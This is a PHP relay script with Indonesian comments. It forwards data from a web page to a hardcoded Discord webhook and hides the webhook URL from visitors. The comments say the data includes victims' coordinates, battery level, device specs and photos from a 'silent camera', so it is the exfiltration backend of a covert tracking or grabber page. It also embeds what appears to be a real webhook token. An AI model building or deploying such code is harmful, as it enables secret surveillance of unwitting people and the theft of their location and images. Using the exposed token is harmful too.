<?php
// CONTOH BACKEND SEDERHANA UNTUK MENYEMBUNYIKAN WEBHOOK DISCORD
// File ini bertindak sebagai "Middleman" atau perantara.
// index.html akan mengirim data ke file PHP ini, lalu PHP ini yang mengirimnya ke Discord.
// Sehingga, orang yang melihat Inspect Element hanya akan melihat "webhook.php", bukan URL aslimu.

// 1. GANTI URL INI DENGAN URL WEBHOOK DISCORD KAMU YANG ASLI
$DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1500542592398397652/aJhsNN61hz6Qv8PTssvjJxZKxpm55uO27EzJtT1jROeQSD8I7fdMH1ImMz94JX45TE01";

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ch = curl_init($DISCORD_WEBHOOK_URL);
    curl_setopt($ch, CURLOPT_POST, 1);
    
    // Siapkan array untuk menampung data form
    $postFields = array();
    
    // 2. Ambil payload JSON (berisi koordinat, baterai, spesifikasi, dll)
    if (isset($_POST['payload_json'])) {
        $postFields['payload_json'] = $_POST['payload_json'];
    }
    
    // 3. Ambil file gambar (jika silent camera berhasil)
    if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        $postFields['file'] = new CURLFile(
            $_FILES['file']['tmp_name'], 
            $_FILES['file']['type'], 
            $_FILES['file']['name']
        );
    }

    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    // 4. Eksekusi request ke Discord API
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    // 5. Kembalikan respon ke index.html
    http_response_code($httpCode);
    echo $response;
} else {
    echo "Endpoint ini hanya menerima request POST.";
}
?>
